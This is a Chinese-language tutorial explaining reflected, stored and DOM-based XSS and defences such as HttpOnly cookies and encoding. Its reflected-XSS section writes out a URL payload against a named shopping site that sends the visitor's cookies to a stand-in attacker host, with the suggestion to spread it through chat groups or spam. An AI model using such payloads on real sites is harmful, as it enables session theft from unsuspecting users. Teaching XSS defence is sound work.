# XSS
xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，为了不和层叠样式表（Cascading Style Sheets, CSS）的缩写混淆，故将跨站脚本攻击缩写为XSS。攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。

## 反射性xss（Reflected XSS）
反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。

主要通过利用系统反馈行为漏洞，并欺骗用户主动触发，从而发起Web攻击。

**可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：**

```js
http://you.163.com/search?keyword=<script>document.location='http://xss.com/get?cookie='+document.cookie</script>
```

如果受骗的用户刚好已经登录过严选网站，那么，用户的登录cookie信息就已经发到了攻击者的服务器（xss.com）了。当然，攻击者会做一些更过分的操作。

## 存储性xss（Stored XSS）
Stored XSS和Reflected XSS的差别就在于，**具有攻击性的脚本被保存到了服务器并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力**。

存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。

1. 发一篇文章，里面包含了恶意脚本
```js
你好！当你看到这段文字时，你的信息已经不安全了！<script>alert('xss')</script>
```

2. 后端没有对文章进行过滤，直接保存文章内容到数据库。

3. 当其他读者看这篇文章的时候，包含的恶意脚本就会执行。

4. 如果我们的操作不仅仅是弹出一个信息，而且删除一篇文章，发一篇反动的文章，或者成为我的粉丝并且将这篇带有恶意脚本的文章转发，这样是不是就具有了攻击性。

## DOM xss  （DOM-based or local XSS）
DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。

### 可能触发DOM型XSS的属性：
* document.referer属性
* window.name属性
* location属性
* innerHTML属性
* documen.write属性

## 跨站脚本攻击可能造成以下影响：

* 利用虚假输入表单骗取用户个人信息。

* 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。

* 显示伪造的文章或图片。

## 防御手段
#### 1. httpOnly
在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息

```js
  // koa
  ctx.cookies.set(name, value, {
      httpOnly: true      // 默认为 true
  })
```

#### 2. 过滤（按规定格式、HtmlEncode、JavaScriptEncode）
* 输入检查

一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。

不仅仅是前端负责，后端也要做相同的过滤检查。

因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。

* HtmlEncode

某些情况下，不能对用户数据进行严格过滤，需要对标签进行转换

![](https://user-gold-cdn.xitu.io/2017/10/11/4d4d037c9605e38189a4f55b017556f1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)

* JavaScriptEncode

对下列字符加上反斜杠

![](https://user-gold-cdn.xitu.io/2017/10/11/051856aa46f5508f0b2737a36c113928?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)
